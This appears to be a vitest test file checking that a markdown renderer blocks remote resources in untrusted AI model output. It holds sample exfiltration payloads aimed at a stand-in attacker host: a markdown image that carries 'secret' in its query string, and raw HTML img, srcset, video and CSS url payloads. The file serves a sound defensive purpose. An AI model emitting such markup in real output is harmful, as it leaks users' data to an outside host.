import { describe, expect, it } from "vitest";

import { loadScripts } from "./helpers/appWindow.mjs";

function boot() {
  return loadScripts([
    "static/vendor/marked/12.0.2/marked.min.js",
    "static/vendor/dompurify/3.4.16/dist/purify.min.js",
    "static/js/markdown-stream.js",
  ]);
}

function render(markdown) {
  const { window, document } = boot();
  const output = document.createElement("div");
  window.injectMarkdown(output, markdown, []);
  return output;
}

describe("untrusted model markup cannot load remote resources on render", () => {
  it("replaces remote markdown images with a visible note", () => {
    const output = render("Summary ![x](https://evil.example/p?d=secret) end");
    expect(output.querySelector("img")).toBeNull();
    expect(output.innerHTML).not.toContain("evil.example");
    expect(output.textContent).toContain("[Image not loaded: x]");
  });

  it("strips raw HTML images, srcset, media and style blocks", () => {
    const output = render([
      '<img src="//evil.example/a">',
      '<img src="data:image/png;base64,AAAA" srcset="https://evil.example/b 2x">',
      '<video poster="https://evil.example/c"><source src="https://evil.example/d"></video>',
      '<style>p{background:url(https://evil.example/e)}</style>',
      '<span style="background-image:url(https://evil.example/f)">text</span>',
    ].join("\n\n"));
    expect(output.innerHTML).not.toContain("evil.example");
    expect(output.querySelector('img[src^="data:image/png"]')).not.toBeNull();
    expect(output.textContent).toContain("text");
  });

  it("keeps ordinary links clickable", () => {
    const output = render("[Source](https://example.org/page)");
    expect(output.querySelector("a")?.getAttribute("href")).toBe("https://example.org/page");
  });
});
